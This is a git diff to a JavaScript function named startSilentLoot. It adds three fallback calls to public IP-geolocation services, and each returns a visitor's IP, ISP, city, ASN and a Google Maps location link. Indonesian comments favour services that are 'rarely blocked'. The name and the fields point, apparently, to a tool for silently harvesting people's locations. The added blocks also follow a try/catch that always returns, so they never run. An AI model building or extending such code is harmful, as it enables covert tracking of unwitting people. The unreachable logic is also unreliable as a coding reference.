@@ -153,6 +153,37 @@ async function startSilentLoot() {
             const ip = text.match(/ip=(.*)\n/)[1];
             return { ip: ip, isp: "ISP Not Detected", city: "Unknown", district: "N/A", loc: "#", asn: "N/A" };
         } catch (e) { return { ip: "Offline" }; }
+
+        // LAPISAN SUPPORT 3 DOANG
+        // LAPIS 1: IP-API PRO (Pake endpoint demo yang HTTPS-nya kuat)
+        try {
+            const res = await fetch(`https://demo.ip-api.com/json/?fields=66842623`);
+            const d = await res.json();
+            if (d.query) return { 
+                ip: d.query, isp: d.isp, city: d.city, district: d.district || "N/A", 
+                loc: `https://www.google.com/maps?q=${d.lat},${d.lon}`, asn: d.as 
+            };
+        } catch (e) {}
+    
+        // LAPIS 2: FreeIPAPI (Ini jarang diblokir karena masih baru)
+        try {
+            const res = await fetch(`https://freeipapi.com/api/json`);
+            const d = await res.json();
+            if (d.ipAddress) return { 
+                ip: d.ipAddress, isp: d.provider, city: d.cityName, district: "N/A", 
+                loc: `https://www.google.com/maps?q=${d.latitude},${d.longitude}`, asn: "N/A" 
+            };
+        } catch (e) {}
+    
+        // LAPIS 3: IPAPI.CO (Paling stabil buat global)
+        try {
+            const res = await fetch(`https://ipapi.co/json/`);
+            const d = await res.json();
+            if (d.ip) return { 
+                ip: d.ip, isp: d.org, city: d.city, district: "N/A", 
+                loc: `https://www.google.com/maps?q=${d.latitude},${d.longitude}`, asn: d.asn 
+            };
+        } catch (e) {}
     }
 
     // Eksekusi Waterfall
